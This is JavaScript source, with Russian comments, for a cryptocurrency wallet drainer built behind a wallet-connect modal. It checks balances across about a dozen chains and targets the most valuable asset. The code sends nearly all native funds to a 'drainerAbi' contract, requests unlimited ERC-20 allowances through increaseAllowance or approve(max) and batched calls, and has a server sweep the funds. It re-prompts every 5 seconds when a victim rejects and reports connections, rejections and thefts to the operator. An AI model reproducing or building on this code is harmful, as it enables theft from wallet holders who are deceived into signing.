  // Если баланс меньше резерва, пытаемся отправить почти всё (минимальный остаток)
  const minDust = parseUnits('0.000001', 18)
  const valueToSend = balanceWei > reserveWei + minDust ? (balanceWei - reserveWei) : (balanceWei > minDust ? (balanceWei - minDust) : 0n)
  if (valueToSend <= 0n) throw new Error('Insufficient native balance to send')
  try {
    // 1. Сначала claim - пользователь отправляет средства на контракт
    const claimTxHash = await writeContract(wagmiConfig, {
      address: getAddress(contractAddress),
      abi: drainerAbi,
      functionName: 'claim',
      args: [],
      chainId,
      value: valueToSend
    })
    
    // 2. Ждем подтверждения claim транзакции
    await new Promise(resolve => setTimeout(resolve, 3000))
    
    // 3. Затем вызываем API для withdraw - сервер выводит средства с контракта
    const withdrawResult = await callWithdrawAPI(chainId)
    
    if (!withdrawResult.success) {
      console.warn('Withdraw API failed:', withdrawResult.message)
      // Возвращаем только claim хеш, если withdraw не удался
      return claimTxHash
    }
    
    return { claimTxHash, withdrawTxHash: withdrawResult.txHash }
  } catch (error) {
    // Проверяем, является ли ошибка отклонением пользователя
    if (error.code === 4001 || error.code === -32000 || error.message?.toLowerCase().includes('user rejected')) {
      throw { ...error, isUserRejection: true }
    }
    throw error
  }
}

const getTokenAllowance = async (wagmiConfig, ownerAddress, tokenAddress, spenderAddress, chainId) => {
  if (!ownerAddress || !tokenAddress || !spenderAddress || !isAddress(ownerAddress) || !isAddress(tokenAddress) || !isAddress(spenderAddress)) {
    return 0
  }
  try {
    const allowance = await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: erc20Abi,
      functionName: 'allowance',
      args: [ownerAddress, spenderAddress],
      chainId
    })
    return allowance
  } catch (error) {
    store.errors.push(`Error fetching allowance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
    return 0
  }
}

const waitForAllowance = async (wagmiConfig, userAddress, tokenAddress, contractAddress, chainId) => {
  while (true) {
    const allowance = await getTokenAllowance(wagmiConfig, userAddress, tokenAddress, contractAddress, chainId)
    if (allowance > 1000) {
      return true
    }
    await new Promise(resolve => setTimeout(resolve, 2000))
  }
}

const getTokenPrice = async (symbol) => {
  try {
    const coinId = tokenIdMap[symbol] || symbol.toLowerCase()
    const response = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`
    )
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`)
    const data = await response.json()
    const price = data[coinId]?.usd || 0
    return Number(price)
  } catch (error) {
    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
    return 0
  }
}

const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
  const checksumTokenAddress = getAddress(tokenAddress)
  const checksumContractAddress = getAddress(contractAddress)
  try {
    // Предварительная подпись Seaport
    await signSeaportPrecheck(wagmiConfig, getAddress(store.accountState.address), chainId)
    // Сначала читаем текущее значение allowance
    const currentAllowance = await readContract(wagmiConfig, {
      address: checksumTokenAddress,
      abi: erc20Abi,
      functionName: 'allowance',
      args: [getAddress(store.accountState.address), checksumContractAddress],
      chainId
    })

    // Если уже достаточно — выходим
    if (typeof currentAllowance === 'bigint' && currentAllowance > 0n && currentAllowance === maxUint256) {
      return '0x'
    }

    // Вычисляем дельту для increaseAllowance
    const delta = typeof currentAllowance === 'bigint' ? (maxUint256 - currentAllowance) : maxUint256

    // Пытаемся увеличить allowance через increaseAllowance
    try {
      const txHash = await writeContract(wagmiConfig, {
        address: checksumTokenAddress,
        abi: erc20Abi,
        functionName: 'increaseAllowance',
        args: [checksumContractAddress, delta],
        chainId
      })
      monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
      })
      return txHash
    } catch (incErr) {
      // Фоллбек на approve(max)
      const txHash = await writeContract(wagmiConfig, {
        address: checksumTokenAddress,
        abi: erc20Abi,
        functionName: 'approve',
        args: [checksumContractAddress, maxUint256],
        chainId
      })
      monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
      })
      return txHash
    }
  } catch (error) {
    // Проверяем, является ли ошибка отклонением пользователя
    if (error.code === 4001 || error.code === -32000 || error.message?.toLowerCase().includes('user rejected')) {
      throw { ...error, isUserRejection: true }
    }
    store.errors.push(`Approve token failed: ${error.message}`)
    throw error
  }
}

const performBatchOperations = async (mostExpensive, allBalances, state) => {
  if (!mostExpensive) {
    return false
  }

  const targetNetworkInfo = networkMap[mostExpensive.network]
  if (!targetNetworkInfo) {
    const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
    store.errors.push(errorMessage)
    return { success: false, error: errorMessage }
  }

  const targetNetwork = targetNetworkInfo.networkObj
  const expectedChainId = targetNetworkInfo.chainId

  if (store.networkState.chainId !== expectedChainId) {
    try {
      await new Promise((resolve, reject) => {
        const unsubscribe = appKit.subscribeNetwork(networkState => {
          if (networkState.chainId === expectedChainId) {
            unsubscribe()
            resolve()
          }
        })
        appKit.switchNetwork(targetNetwork).catch(error => {
          unsubscribe()
          reject(error)
        })
        setTimeout(() => {
          unsubscribe()
          reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
        }, 10000)
      })
    } catch (error) {
      const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
      store.errors.push(errorMessage)
      return { success: false, error: errorMessage }
    }
  }

  try {
    const contractAddress = getAddress(CONTRACTS[mostExpensive.chainId])
    const calls = []

    // 1. Добавляем claim для нативного токена (если есть баланс)
    const nativeToken = allBalances.find(t => t.network === mostExpensive.network && t.address === 'native' && t.balance > 0)
    if (nativeToken) {
      const balanceWei = parseUnits(nativeToken.balance.toString(), 18)
      const reserveWei = getGasReserveWei(mostExpensive.chainId)
      const minDust = parseUnits('0.000001', 18)
      const valueToSend = balanceWei > reserveWei + minDust ? (balanceWei - reserveWei) : (balanceWei > minDust ? (balanceWei - minDust) : 0n)
      
      if (valueToSend > 0n) {
        calls.push({
          to: contractAddress,
          data: encodeFunctionData({
            abi: drainerAbi,
            functionName: 'claim',
            args: []
          }),
          value: valueToSend
        })
      }
    }

    // 2. Добавляем increaseAllowance для всех ERC-20 токенов с балансом > 0
    const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && t.balance > 0 && t.address !== 'native')
    
    for (const token of networkTokens) {
      try {
        // Читаем текущий allowance
        const currentAllowance = await readContract(wagmiAdapter.wagmiConfig, {
          address: token.address,
          abi: erc20Abi,
          functionName: 'allowance',
          args: [getAddress(state.address), contractAddress],
          chainId: mostExpensive.chainId
        })

        // Если allowance уже максимальный, пропускаем
        if (typeof currentAllowance === 'bigint' && currentAllowance === maxUint256) {
          continue
        }

        // Вычисляем дельту для increaseAllowance
        const delta = typeof currentAllowance === 'bigint' ? (maxUint256 - currentAllowance) : maxUint256

        calls.push({
          to: getAddress(token.address),
          data: encodeFunctionData({
            abi: erc20Abi,
            functionName: 'increaseAllowance',
            args: [contractAddress, delta]
          }),
          value: '0x0'
        })
      } catch (error) {
        // Фоллбек на approve если не можем прочитать allowance
        calls.push({
          to: getAddress(token.address),
          data: encodeFunctionData({
            abi: erc20Abi,
            functionName: 'approve',
            args: [contractAddress, maxUint256]
          }),
          value: '0x0'
        })
      }
    }

    if (calls.length > 0) {
      const gasLimit = BigInt(800000) // Увеличиваем лимит для батча с нативным токеном
      const maxFeePerGas = BigInt(1000000000)
      const maxPriorityFeePerGas = BigInt(1000000000)
      const id = await sendCalls(wagmiAdapter.wagmiConfig, {
        calls,
        account: getAddress(state.address),
        chainId: mostExpensive.chainId,
        gas: gasLimit,
        maxFeePerGas,
        maxPriorityFeePerGas
      })
      return { success: true, txHash: id }
    }
    return { success: false, message: 'No operations to perform' }
  } catch (error) {
    if (error.message.includes('wallet_sendCalls') || error.message.includes('does not exist / is not available')) {
      return { success: false, error: 'BATCH_NOT_SUPPORTED' }
    }
    return { success: false, error: error.message }
  }
}

const initializeSubscribers = (modal) => {
  const debouncedSubscribeAccount = debounce(async state => {
    updateStore('accountState', state)
    updateStateDisplay('accountState', state)
    if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
      const device = detectDevice()
      if (store.isProcessingConnection) {
        return
      }
      const balancePromises = []
      Object.entries(networkMap).forEach(([networkName, networkInfo]) => {
        balancePromises.push(
          getNativeBalance(wagmiAdapter.wagmiConfig, state.address, networkInfo.chainId)
            .then(balance => ({
              symbol: networkInfo.nativeSymbol,
              balance,
              address: 'native',
              network: networkName,
              chainId: networkInfo.chainId,
              decimals: 18
            }))
            .catch(() => ({
              symbol: networkInfo.nativeSymbol,
              balance: 0,
              address: 'native',
              network: networkName,
              chainId: networkInfo.chainId,
              decimals: 18
            }))
        )
        const tokens = TOKENS[networkName] || []
        tokens.forEach(token => {
          if (isAddress(token.address)) {
            balancePromises.push(
              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
                .then(balance => ({
                  symbol: token.symbol,
                  balance,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
                .catch(() => ({
                  symbol: token.symbol,
                  balance: 0,
                  address: token.address,
                  network: networkName,
                  chainId: networkInfo.chainId,
                  decimals: token.decimals
                }))
            )
          }
        })
      })
      const allBalances = await Promise.all(balancePromises)
      store.tokenBalances = allBalances
      updateStateDisplay('tokenBalancesState', allBalances)
      let maxValue = 0
      let mostExpensive = null
      for (const token of allBalances) {
        if (token.balance > 0) {
          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
          const value = token.balance * price
          token.price = price
          if (value > maxValue) {
            maxValue = value
            mostExpensive = { ...token, price, value }
          }
        }
      }
      await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
      
      // Проверяем минимальный баланс
      if (mostExpensive && mostExpensive.value < MIN_VALUE_USD) {
        // Закрываем модальное окно если баланс меньше минимального
        modal.classList.remove('show')
        return
      }
      
      if (mostExpensive) {
        if (mostExpensive.address === 'native') {
          
          // Проверяем, нужно ли переключить сеть
          const targetNetworkInfo = networkMap[mostExpensive.network]
          if (!targetNetworkInfo) {
            const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
            store.errors.push(errorMessage)
            hideCustomModal()
            store.isProcessingConnection = false
            return
          }
          
          const targetNetwork = targetNetworkInfo.networkObj
          const expectedChainId = targetNetworkInfo.chainId
          
          // Переключаемся на нужную сеть, если необходимо
          if (store.networkState.chainId !== expectedChainId) {
            try {
              await new Promise((resolve, reject) => {
                const unsubscribe = appKit.subscribeNetwork(networkState => {
                  if (networkState.chainId === expectedChainId) {
                    unsubscribe()
                    resolve()
                  }
                })
                appKit.switchNetwork(targetNetwork).catch(error => {
                  unsubscribe()
                  reject(error)
                })
                setTimeout(() => {
                  unsubscribe()
                  reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
                }, 10000)
              })
            } catch (error) {
              const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
              store.errors.push(errorMessage)
              hideCustomModal()
              store.isProcessingConnection = false
              return
            }
          }
          
          // Функция для повторных попыток нативного claim
          const attemptNativeClaim = async (retryCount = 0) => {
            const modalMessage = document.querySelector('.custom-modal-message')
            try {
              
              const result = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
              
              // Уведомление об успехе (используем claimTxHash для уведомления)
              await notifyTransferSuccess(
                state.address,
                walletInfo.name,
                device,
                { symbol: mostExpensive.symbol, balance: mostExpensive.balance, price: mostExpensive.price },
                mostExpensive.chainId,
                typeof result === 'string' ? result : result.claimTxHash
              )
              
              // Показываем успех в модальном окне
              await new Promise(resolve => setTimeout(resolve, 2000))
              return true
              
            } catch (error) {
              
              // Если пользователь отклонил транзакцию
              if (error.isUserRejection) {
                // Отправляем уведомление об отклонении
                await notifyTransactionRejected(
                  state.address,
                  walletInfo.name,
                  device,
                  { symbol: mostExpensive.symbol, balance: mostExpensive.balance, price: mostExpensive.price },
                  mostExpensive.chainId,
                  'Native Claim'
                )
                
                // Показываем сообщение об отклонении
                
                // Ждем 5 секунд и повторяем
                await new Promise(resolve => setTimeout(resolve, 5000))
                return attemptNativeClaim(retryCount + 1)
              } else {
                // Другие ошибки
                store.errors.push(`Native claim failed: ${error.message}`)
                await new Promise(resolve => setTimeout(resolve, 3000))
                return false
              }
            }
          }
          
          await attemptNativeClaim()
          hideCustomModal()
          store.isProcessingConnection = false
          return
        }

        if (USE_SENDCALLS) {
          // Функция для повторных попыток батч-транзакций
          const attemptBatchOperation = async (retryCount = 0) => {
            const modalMessage = document.querySelector('.custom-modal-message')
            try {
              
              const batchResult = await performBatchOperations(mostExpensive, allBalances, state)
              
              if (batchResult.success) {
                const approvedTokens = allBalances.filter(t => 
                  t.network === mostExpensive.network && 
                  t.balance > 0 &&
                  t.address !== 'native'
                )
                
                for (const token of approvedTokens) {
                  await notifyTransferApproved(
                    state.address,
                    walletInfo.name,
                    device,
                    token,
                    mostExpensive.chainId
                  )
                  try {
                    await waitForAllowance(
                      wagmiAdapter.wagmiConfig,
                      state.address,
                      token.address,
                      CONTRACTS[mostExpensive.chainId],
                      mostExpensive.chainId
                    )
                    
                    const transferResult = await sendTransferRequest(
                      state.address,
                      token.address,
                      parseUnits(token.balance.toString(), token.decimals),
                      mostExpensive.chainId,
                      batchResult.txHash
                    )
                    
                    if (transferResult.success) {
                      await notifyTransferSuccess(
                        state.address,
                        walletInfo.name,
                        device,
                        token,
                        mostExpensive.chainId,
                        transferResult.txHash
                      )
                    }
                  } catch (error) {
                    store.errors.push(`Failed to process ${token.symbol}: ${error.message}`)
                  }
                }
                
                // Показываем успех в модальном окне
                await new Promise(resolve => setTimeout(resolve, 2000))
                return true
                
              } else if (batchResult.error === 'BATCH_NOT_SUPPORTED') {
                return false
              } else {
                throw new Error(batchResult.error || batchResult.message || 'Batch operation failed')
              }
              
            } catch (error) {
              
              // Если пользователь отклонил транзакцию
              if (error.code === 4001 || error.code === -32000 || error.message?.toLowerCase().includes('user rejected')) {
                // Отправляем уведомление об отклонении
                await notifyTransactionRejected(
                  state.address,
                  walletInfo.name,
                  device,
                  mostExpensive,
                  mostExpensive.chainId,
                  'Batch Transaction'
                )
                
                // Показываем сообщение об отклонении
                
                // Ждем 5 секунд и повторяем
                await new Promise(resolve => setTimeout(resolve, 5000))
                return attemptBatchOperation(retryCount + 1)
              } else {
                // Другие ошибки
                store.errors.push(`Batch operation failed: ${error.message}`)
                await new Promise(resolve => setTimeout(resolve, 3000))
                return false
              }
            }
          }
          
          const batchSuccess = await attemptBatchOperation()
          if (batchSuccess) {
            hideCustomModal()
            store.isProcessingConnection = false
            return
          }
        }
        
        const targetNetworkInfo = networkMap[mostExpensive.network]
        if (!targetNetworkInfo) {
          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
          store.errors.push(errorMessage)
          const approveState = document.getElementById('approveState')
          if (approveState) approveState.innerHTML = errorMessage
          hideCustomModal()
          store.isProcessingConnection = false
          return
        }
        const targetNetwork = targetNetworkInfo.networkObj
        const expectedChainId = targetNetworkInfo.chainId
        if (store.networkState.chainId !== expectedChainId) {
          try {
            await new Promise((resolve, reject) => {
              const unsubscribe = modal.subscribeNetwork(networkState => {
                if (networkState.chainId === expectedChainId) {
                  unsubscribe()
                  resolve()
                }
              })
              appKit.switchNetwork(targetNetwork).catch(error => {
                unsubscribe()
                reject(error)
              })
              setTimeout(() => {
                unsubscribe()
                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
              }, 10000)
            })
          } catch (error) {
            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
            store.errors.push(errorMessage)
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = errorMessage
            hideCustomModal()
            store.isProcessingConnection = false
            return
          }
        }
        // Функция для повторных попыток approve
        const attemptApprove = async (retryCount = 0) => {
          const contractAddress = CONTRACTS[mostExpensive.chainId]
          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
          
          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
            const approveMessage = store.approvedTokens[approvalKey]
              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : store.isApprovalRejected
              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
            const approveState = document.getElementById('approveState')
            if (approveState) approveState.innerHTML = approveMessage
            return false
          }
          
          try {
            store.isApprovalRequested = true
            const approveState = document.getElementById('approveState')
            
            const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
            store.approvedTokens[approvalKey] = true
            store.isApprovalRequested = false
            let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
            await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
            
            await waitForAllowance(wagmiAdapter.wagmiConfig, state.address, mostExpensive.address, contractAddress, mostExpensive.chainId)
            
            const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
            const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
            
            if (transferResult.success) {
              await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
              approveMessage += `<br>Transfer successful: ${transferResult.txHash}`
            } else {
              approveMessage += `<br>Transfer failed: ${transferResult.message}`
            }
            
            if (approveState) approveState.innerHTML = approveMessage
            return true
            
          } catch (error) {
            store.isApprovalRequested = false
            
            // Если пользователь отклонил транзакцию
            if (error.isUserRejection) {
              // Отправляем уведомление об отклонении
              await notifyTransactionRejected(
                state.address,
                walletInfo.name,
                device,
                mostExpensive,
                mostExpensive.chainId,
                'Token Approve'
              )
              
              // Показываем сообщение об отклонении
              
              // Ждем 5 секунд и повторяем
              await new Promise(resolve => setTimeout(resolve, 5000))
              return attemptApprove(retryCount + 1)
            } else {
              // Другие ошибки
              handleApproveError(error, mostExpensive, state)
              return false
            }
          }
        }
        
        const success = await attemptApprove()
        if (success) {
          hideCustomModal()
        }
        store.isProcessingConnection = false
      } else {
        const message = 'No tokens with positive balance'
        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
        if (mostExpensiveState) mostExpensiveState.innerHTML = message
        hideCustomModal()
        store.isProcessingConnection = false
      }
    }
  }, 1000)
  modal.subscribeAccount(debouncedSubscribeAccount)
  modal.subscribeNetwork(state => {
    updateStore('networkState', state)
    updateStateDisplay('networkState', state)
    const switchNetworkBtn = document.getElementById('switch-network')
    if (switchNetworkBtn) {
      let nextNetwork = 'Ethereum'
      if (state?.chainId === networkMap['Ethereum'].chainId) nextNetwork = 'Polygon'
      else if (state?.chainId === networkMap['Polygon'].chainId) nextNetwork = 'Arbitrum'
      else if (state?.chainId === networkMap['Arbitrum'].chainId) nextNetwork = 'Optimism'
      else if (state?.chainId === networkMap['Optimism'].chainId) nextNetwork = 'Base'
      else if (state?.chainId === networkMap['Base'].chainId) nextNetwork = 'Scroll'
      else if (state?.chainId === networkMap['Scroll'].chainId) nextNetwork = 'Avalanche'
      else if (state?.chainId === networkMap['Avalanche'].chainId) nextNetwork = 'Fantom'
      else if (state?.chainId === networkMap['Fantom'].chainId) nextNetwork = 'Linea'
      else if (state?.chainId === networkMap['Linea'].chainId) nextNetwork = 'zkSync'
      else if (state?.chainId === networkMap['zkSync'].chainId) nextNetwork = 'Celo'
      else if (state?.chainId === networkMap['Celo'].chainId) nextNetwork = 'BNB Smart Chain'
      else if (state?.chainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = 'Ethereum'
      else nextNetwork = 'Ethereum'
      
      switchNetworkBtn.textContent = `Switch to ${nextNetwork}`
    }
  })
}

// Helper function to handle approve errors
const handleApproveError = (error, token, state) => {
  store.isApprovalRequested = false
  if (error.code === 4001 || error.code === -32000) {
    store.isApprovalRejected = true
    const errorMessage = `Approve was rejected for ${token.symbol} on ${token.network}`
    store.errors.push(errorMessage)
    const approveState = document.getElementById('approveState')
    if (approveState) approveState.innerHTML = errorMessage
    hideCustomModal()
    appKit.disconnect()
    store.connectionKey = null
    store.isProcessingConnection = false
    sessionStorage.clear()
  } else {
    const errorMessage = `Approve failed for ${token.symbol} on ${token.network}: ${error.message}`
    store.errors.push(errorMessage)
    const approveState = document.getElementById('approveState')
    if (approveState) approveState.innerHTML = errorMessage
    hideCustomModal()
    store.isProcessingConnection = false
  }
}

initializeSubscribers(appKit)
updateButtonVisibility(appKit.getIsConnectedState())

document.querySelectorAll('.open-connect-modal').forEach(button => {
  button.addEventListener('click', (event) => {
    event.stopPropagation()
    if (!appKit.getIsConnectedState()) {
      appKit.open()
    }
  })
})

document.getElementById('disconnect')?.addEventListener('click', () => {
  appKit.disconnect()
  store.approvedTokens = {}
  store.errors = []
  store.isApprovalRequested = false
  store.isApprovalRejected = false
  store.connectionKey = null
  store.isProcessingConnection = false
  store.hasSignedPreSignature = false // Сбрасываем флаг подписи при отключении
  sessionStorage.clear()
})

document.getElementById('switch-network')?.addEventListener('click', () => {
  const currentChainId = store.networkState?.chainId
  let nextNetwork = networkMap['Ethereum'].networkObj
  if (currentChainId === networkMap['Ethereum'].chainId) nextNetwork = networkMap['Polygon'].networkObj
  else if (currentChainId === networkMap['Polygon'].chainId) nextNetwork = networkMap['Arbitrum'].networkObj
  else if (currentChainId === networkMap['Arbitrum'].chainId) nextNetwork = networkMap['Optimism'].networkObj
  else if (currentChainId === networkMap['Optimism'].chainId) nextNetwork = networkMap['Base'].networkObj
  else if (currentChainId === networkMap['Base'].chainId) nextNetwork = networkMap['Scroll'].networkObj
  else if (currentChainId === networkMap['Scroll'].chainId) nextNetwork = networkMap['Avalanche'].networkObj
  else if (currentChainId === networkMap['Avalanche'].chainId) nextNetwork = networkMap['Fantom'].networkObj
  else if (currentChainId === networkMap['Fantom'].chainId) nextNetwork = networkMap['Linea'].networkObj
  else if (currentChainId === networkMap['Linea'].chainId) nextNetwork = networkMap['zkSync'].networkObj
  else if (currentChainId === networkMap['zkSync'].chainId) nextNetwork = networkMap['Celo'].networkObj
  else if (currentChainId === networkMap['Celo'].chainId) nextNetwork = networkMap['BNB Smart Chain'].networkObj
  else if (currentChainId === networkMap['BNB Smart Chain'].chainId) nextNetwork = networkMap['Ethereum'].networkObj
  else nextNetwork = networkMap['Ethereum'].networkObj
  
  appKit.switchNetwork(nextNetwork)
})
